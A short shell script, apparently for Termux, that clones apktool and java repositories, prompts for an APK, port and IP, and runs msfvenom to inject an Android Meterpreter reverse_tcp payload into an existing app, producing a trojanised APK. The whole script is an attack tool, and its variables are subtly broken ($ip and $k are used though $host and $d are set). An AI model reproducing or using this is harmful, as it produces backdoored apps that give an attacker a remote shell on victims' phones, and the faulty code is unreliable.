git clone https://github.com/Hax4us/apktool
clear
git clone https://github.com/Hax4us/java
clear

figlet MOMUIL
echo 'Enter Your Name Apk :'
read apk
echo ' Enter Your Apk :'
read a2
echo 'Enter Your Port :'
read port
echo 'Enter Your IP :'
read host
a='-o'
b='-x'
g='-p'
d='-k'
msfvenom $b /sdcard/$apk.apk $g android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port $k $a /sdcard/$a2.apk
